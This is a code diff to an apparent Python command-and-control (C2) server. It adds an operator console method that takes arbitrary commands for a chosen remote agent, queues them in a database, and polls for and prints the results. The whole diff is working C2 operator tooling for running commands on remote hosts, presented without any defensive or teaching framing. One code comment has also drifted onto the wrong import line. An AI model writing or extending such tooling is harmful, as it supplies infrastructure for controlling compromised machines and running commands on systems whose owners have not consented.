@@ -1,7 +1,8 @@
 import socket
 import sys
 import os
-import shlex # For splitting commands robustly
+import shlex
+import time # For splitting commands robustly
 
 # Ensure the core and utils directories are in the Python path
 # This allows us to import modules like 'db_manager' and 'logger'
@@ -162,6 +163,74 @@ class C2Server:
             except Exception as e:
                 logger.error(f"An unexpected error occurred in CLI: {e}", exc_info=True)
                 print(f"An error occurred: {e}")
+                
+    def _interact_with_agent(self, agent_identifier):
+        """
+        Allows interaction with a specific agent.
+        Tasks are added to the DB and polled for completion.
+        """
+        try:
+            agent = self.db_manager.get_agent_by_id(agent_identifier)
+            if not agent:
+                print(f"Agent with ID '{agent_identifier}' not found.")
+                logger.warning(f"Attempted interaction with non-existent agent ID: {agent_identifier}")
+                return
+
+            print(f"Interacting with Agent ID: {agent['id']} (Hostname: {agent['hostname']})")
+            print("Type 'back' to return to main prompt.")
+
+            while True:
+                try:
+                    command_line = input(f"C2({agent['id']})> ").strip()
+                    if not command_line:
+                        continue
+
+                    if command_line.lower() == 'back':
+                        print(f"Exiting interaction with Agent ID: {agent['id']}")
+                        break
+
+                    logger.info(f"Executing command on agent {agent['id']}: '{command_line}'")
+                    print(f"Executing command on agent {agent['id']}: '{command_line}'")
+
+                    # Add the task to the database
+                    task_id = self.db_manager.add_task(agent['id'], command_line)
+
+                    if task_id:
+                        print(f"Task {task_id} queued. Waiting for agent output (max 60s timeout)...")
+                        # Poll for task completion
+                        timeout_start = time.time()
+                        max_timeout = 60 # seconds
+                        poll_interval = 1 # seconds
+
+                        while time.time() - timeout_start < max_timeout:
+                            task = self.db_manager.get_task_by_id(task_id)
+                            if task and task['status'] == 'completed':
+                                print(f"\n--- Output for Task {task_id} ---")
+                                print(task['output'])
+                                print("----------------------------")
+                                break
+                            elif task and task['status'] == 'failed':
+                                print(f"\n--- Task {task_id} FAILED ---")
+                                print(task['output'] if task['output'] else "[No error output]")
+                                print("--------------------------")
+                                break
+                            time.sleep(poll_interval)
+                        else:
+                            print(f"\n[!] Task {task_id} timed out after {max_timeout} seconds. Agent may be offline or task processing is slow.")
+                            # Optionally update task status to 'timed_out' in DB
+                            self.db_manager.update_task_status(task_id, 'timed_out')
+                    else:
+                        print(f"Error: Could not add task to database for agent {agent['id']}.")
+
+                except KeyboardInterrupt:
+                    print("\n[!] Interaction interrupted. Type 'back' to exit interaction or Ctrl+C again to exit server.")
+                except Exception as e:
+                    logger.error(f"An error occurred during agent interaction: {e}", exc_info=True)
+                    print(f"[!] An error occurred: {e}")
+
+        except Exception as e:
+            logger.error(f"Error setting up interaction with agent {agent_identifier}: {e}", exc_info=True)
+            print(f"Error: {e}")
 
 if __name__ == "__main__":
     server = C2Server()
